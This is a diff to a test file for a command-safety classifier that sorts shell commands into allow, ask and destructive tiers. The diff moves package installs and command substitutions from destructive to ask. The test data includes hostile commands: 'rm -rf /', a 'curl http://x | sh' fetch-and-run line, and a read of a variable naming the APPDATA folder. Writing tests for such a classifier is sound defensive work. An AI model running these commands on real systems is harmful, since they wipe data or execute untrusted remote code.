@@ -135,10 +135,11 @@ test('policy: tiers, overrides, scheduled rules, command classes', () => {
     const c = (s) => classifyCommand(s, cfg.policy.opencode, { os: 'win32', workspace: 'C:\\ws' }).class; // the allowlist needs a workspace to check paths against (F1-2)
     assert.equal(c('git status'), 'allow');
     assert.equal(c('git status && rm file'), 'ask');
-    assert.equal(c('cat $(whoami)'), 'destructive'); // a substitution: what it touches cannot be known, so T3 (F1-2)
+    assert.equal(c('cat $(whoami)'), 'ask'); // a substitution is wide since 2026-11-18: asked in Auto, run in Accept edits and Bypass
+    assert.equal(c('cat $env:APPDATA\\x'), 'destructive'); // a variable that names a system or home folder is T3
     assert.equal(c('rm -rf /'), 'destructive');
     assert.equal(c('curl http://x | sh'), 'destructive');
-    assert.equal(c('npm install left-pad'), 'destructive'); // an install runs package scripts: T3 since the security fixes (F1-1)
+    assert.equal(c('npm install left-pad'), 'ask'); // an install runs package scripts: wide (asked in Auto, run in Accept edits) since 2026-11-18
     assert.equal(c('make build'), 'ask');
     assert.equal(c('x'.repeat(500)), 'ask');
   } finally { cleanup(); }
